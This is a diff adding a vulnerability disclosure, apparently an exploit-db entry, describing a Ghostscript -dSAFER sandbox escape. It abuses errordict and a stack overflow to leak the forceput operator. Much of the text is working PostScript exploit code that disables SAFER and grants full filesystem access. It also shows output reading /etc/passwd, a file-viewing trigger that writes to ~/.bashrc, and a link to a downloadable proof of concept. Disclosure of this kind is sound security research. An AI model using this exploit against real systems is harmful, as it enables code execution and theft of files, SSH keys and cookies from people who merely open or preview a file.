@@ -1,0 +1,56 @@
+While documenting bug 1675, I noticed another problem with errordict in ghostscript. Full working exploit that works in the last few versions is attached, viewing it in evince, imagemagick, gimp, okular, etc should add a line to ~/.bashrc. Additionally, because nautilus will automatically invoke evince-thumbnailer without any user-interaction, just browsing a website is enough to trigger the vulnerability.
+
+taviso@ubuntu:~$ convert exploit.jpg output.jpg
+taviso@ubuntu:~$ tail -1 ~/.bashrc
+echo pwned by postscript
+
+Good news: If your distro ships gnome-desktop 3.25.90 or later and wasn't bananas enough to disable sandboxing (yes, some are really doing that, see  bug 1643 ), I don't know of any way to trigger automatic exploitation. If you open the file manually, you're still in trouble though.
+
+One of the core access control features in postscript is the ability to mark procedures executeonly, this prevents users from peeking inside system routines and getting references to powerful operators they shouldn't have access to. I have a full description of how the executeonly mechanism works in bug 1675.
+
+Until recently you could install an error handler in errordict and if you cause an executeonly procedure to stop ("stop" is the postscript term for "throw an exception"), that would expose the faulting operator to the error handler. That is no longer possible, because errordict is ignored in the -dSAFER sandbox.
+
+Unfortunately, the fix was incomplete, because you could still make the invocation of the errorhandler itself stop by filling up the stack with junk and making it /stackoverflow.
+
+One way to exploit this is to find an executeonly procedure that can stop in two different ways, you trigger the first exception and then you make calling the errorhandler stop (/stackoverflow or /execoverflow will do). When that fails the operand stack is left in an inconsistent state, because ghostscript was trying to set up the errorhandler but failed. 
+
+Here is how to exploit it:
+
+% first, fill up the stack with junk so there is only a tiny bit of room for the errorhandler
+GS>0 1 300368 {} for
+
+% We can make /switch_to_normal_marking_ops fail by making pdfopdict a non-dictionary
+GS<300369>/pdfopdict null def
+
+% call /switch_to_normal_marking_ops (which is executeonly)
+GS<300369>GS_PDF_ProcSet /switch_to_normal_marking_ops get stopped
+
+% that failed because of /typecheck writing to pdfopdict
+GS<2>==
+true
+
+% And if we look at the last few elements of the saved stack...
+GS<1>dup dup length 10 sub 10 getinterval ==
+[300364 300365 300366 300367 300368 null /m {normal_m} --.forceput-- /typecheck]
+
+% The failed operator is on there ready to be passed to the errorhandler.
+
+forceput is a very powerful operator that ignores all access controls, we can extract it from the stack, and then do whatever we like.
+
+% Lets disable SAFER and give ourselves access to the whole filesystem (including .bashrc, ssh keys, chrome cookies, everything)
+systemdict /SAFER false forceput
+systemdict /userparams get /PermitFileControl [(*)] forceput
+systemdict /userparams get /PermitFileWriting [(*)] forceput
+systemdict /userparams get /PermitFileReading [(*)] forceput
+
+Putting it all together, here is reading /etc/passwd just to demo:
+
+$ ./gs -dSAFER -f test.ps 
+GPL Ghostscript GIT PRERELEASE 9.26 (2018-09-13)
+Copyright (C) 2018 Artifex Software, Inc.  All rights reserved.
+This software comes with NO WARRANTY: see the file PUBLIC for details.
+(root:x:0:0:root:/root:/bin/bash)
+
+
+Proof of Concept:
+https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45573.zip
